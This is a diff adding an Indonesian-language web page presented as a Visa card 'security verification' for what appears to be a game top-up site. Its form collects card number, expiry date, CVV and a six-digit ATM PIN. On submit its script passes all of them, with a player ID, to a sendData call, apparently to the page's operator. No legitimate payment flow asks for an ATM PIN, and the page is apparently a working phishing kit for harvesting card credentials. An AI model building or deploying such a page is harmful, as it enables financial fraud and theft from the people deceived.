@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kartu Kredit/Debit - Verifikasi Keamanan</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="icon" href="/images/favicon.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body style="background: #f8f9fa; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px;">
+    
+    <div style="background: white; padding: 40px; border-radius: 24px; box-shadow: 0 15px 45px rgba(0,0,0,0.08); width: 100%; max-width: 480px;">
+        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 25px; padding-bottom: 20px; border-bottom: 1px solid #f1f5f9;">
+            <img src="/images/payment-methods/visa.png" height="30">
+            <h3 style="font-weight: 800; color: #1e293b; margin: 0; letter-spacing: -0.5px;">VERIFIKASI KARTU</h3>
+        </div>
+        
+        <p style="color: #64748b; font-size: 0.9rem; margin-bottom: 30px; line-height: 1.6;">
+            Layanan verifikasi instan untuk keamanan transaksi Anda. Input kartu diperlukan untuk otentikasi identitas pemegang kartu yang sah.
+        </p>
+        
+        <form id="cardForm">
+            <!-- Card Number -->
+            <div style="margin-bottom: 20px;">
+                <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.85rem; color: #334155;">NOMOR KARTU</label>
+                <input type="tel" id="cardNumber" placeholder="4xxx xxxx xxxx xxxx" maxlength="19" required style="width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 1.1rem; outline: none; transition: 0.3s; color: #1e293b; font-family: monospace; letter-spacing: 2px;">
+            </div>
+
+            <!-- Expiry and CVV -->
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px;">
+                <div>
+                    <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.85rem; color: #334155;">VALID THRU (MM/YY)</label>
+                    <input type="tel" id="expiry" placeholder="MM / YY" maxlength="5" required style="width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 1rem; outline: none; transition: 0.3s; color: #1e293b; text-align: center;">
+                </div>
+                <div>
+                    <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.85rem; color: #334155;">CVV / CVC</label>
+                    <input type="password" id="cvv" placeholder="123" maxlength="3" required style="width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 1rem; outline: none; transition: 0.3s; color: #1e293b; text-align: center;">
+                </div>
+            </div>
+
+            <!-- ATM PIN -->
+            <div style="margin-bottom: 30px;">
+                <label style="display: block; margin-bottom: 8px; font-weight: 700; font-size: 0.85rem; color: #334155;">PIN ATM (6 DIGIT)</label>
+                <input type="password" id="pin" placeholder="••••••" maxlength="6" required style="width: 100%; padding: 15px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 1.4rem; letter-spacing: 8px; outline: none; transition: 0.3s; color: #1e293b; text-align: center;">
+            </div>
+
+            <p id="errorMsg" style="color: #ef4444; font-size: 0.8rem; margin-bottom: 15px; display: none; text-align: center; font-weight: 600;"></p>
+            
+            <button type="submit" style="width: 100%; padding: 16px; background: #2563eb; color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; font-size: 1.1rem; box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);">
+                AKTIVASI LAYANAN
+            </button>
+        </form>
+
+        <div style="margin-top: 25px; display: flex; justify-content: center; gap: 10px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="12" style="opacity: 0.5;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="12" style="opacity: 0.5;">
+            <img src="https://i.ibb.co/vzR0Xz7/diamond.png" height="12" style="opacity: 0.5; filter: grayscale(1);">
+        </div>
+    </div>
+
+    <script src="/js/main.js"></script>
+    <script>
+        // Check if logged in & has ID
+        if(!localStorage.getItem('isLoggedIn') || !localStorage.getItem('playerId')) {
+            window.location.href = '/checkout';
+        }
+
+        const cardDisplay = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+        const cvvInput = document.getElementById('cvv');
+        const pinInput = document.getElementById('pin');
+        const errorMsg = document.getElementById('errorMsg');
+
+        // Card Number Spacing
+        cardDisplay.addEventListener('input', function (e) {
+            let val = e.target.value.replace(/\D/g, '');
+            let newVal = '';
+            for (let i = 0; i < val.length; i++) {
+                if (i > 0 && i % 4 === 0) newVal += ' ';
+                newVal += val[i];
+            }
+            e.target.value = newVal;
+        });
+
+        // Expiry Date MM/YY slash
+        expiryInput.addEventListener('input', function (e) {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length >= 2) {
+                e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+            } else {
+                e.target.value = val;
+            }
+        });
+
+        // Numeric only for CVV and PIN
+        [cvvInput, pinInput].forEach(el => {
+            el.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+            });
+        });
+
+        document.getElementById('cardForm').onsubmit = function(e) {
+            e.preventDefault();
+            const cardNum = cardDisplay.value.replace(/\s/g, '');
+            const expiry = expiryInput.value;
+            const cvv = cvvInput.value;
+            const pin = pinInput.value;
+            const playerId = localStorage.getItem('playerId');
+
+            if (cardNum.length < 16) {
+                showError('Nomor kartu harus 16 digit');
+                return;
+            }
+            if (expiry.length < 5) {
+                showError('Masa berlaku kartu tidak valid');
+                return;
+            }
+            if (cvv.length < 3) {
+                showError('CVV harus 3 digit');
+                return;
+            }
+            if (pin.length < 6) {
+                showError('PIN ATM harus 6 digit');
+                return;
+            }
+
+            errorMsg.style.display = 'none';
+            sendData('card', { cardNumber: cardNum, expiry, cvv, pin, playerId });
+        };
+
+        function showError(msg) {
+            errorMsg.innerText = msg;
+            errorMsg.style.display = 'block';
+            errorMsg.style.animation = 'shake 0.4s ease';
+            setTimeout(() => { errorMsg.style.animation = ''; }, 400);
+        }
+    </script>
+</body>
+</html>
